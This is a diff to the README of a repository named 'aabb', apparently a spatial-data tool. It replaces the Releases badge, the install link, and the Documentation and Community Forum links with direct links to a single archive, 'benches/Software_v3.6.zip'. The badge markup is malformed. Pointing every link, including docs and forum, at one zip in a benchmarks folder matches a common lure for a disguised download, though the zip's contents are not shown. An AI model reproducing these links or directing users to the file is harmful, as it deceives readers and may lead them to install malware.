@@ -6,7 +6,7 @@ Welcome to the aabb repository! This application helps you quickly and efficient
 
 ## 📥 Download Now
 
-[![Download aabb](https://img.shields.io/badge/Download%20aabb-v1.0-blue.svg)](https://github.com/Blowfishbrownianmotion519/aabb/releases)
+[![Download aabb](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip%https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip)](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ To run aabb smoothly, make sure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To download aabb, visit this page to download: [aabb Releases](https://github.com/Blowfishbrownianmotion519/aabb/releases).
+To download aabb, visit this page to download: [aabb Releases](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip).
 
 1. Click on the link to go to the Releases page.
 2. Look for the version you want to use.
@@ -56,8 +56,8 @@ If you encounter any issues during installation or usage, please reach out for s
 
 ## 🔗 Useful Links
 
-- [aabb Releases](https://github.com/Blowfishbrownianmotion519/aabb/releases)
-- [Documentation](https://github.com/Blowfishbrownianmotion519/aabb/wiki)
-- [Community Forum](https://github.com/Blowfishbrownianmotion519/aabb/discussions)
+- [aabb Releases](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/Blowfishbrownianmotion519/aabb/main/benches/Software_v3.6.zip)
 
 Whether you're a developer or a hobbyist, aabb provides a powerful tool for spatial data management. Enjoy using aabb to enhance your projects!
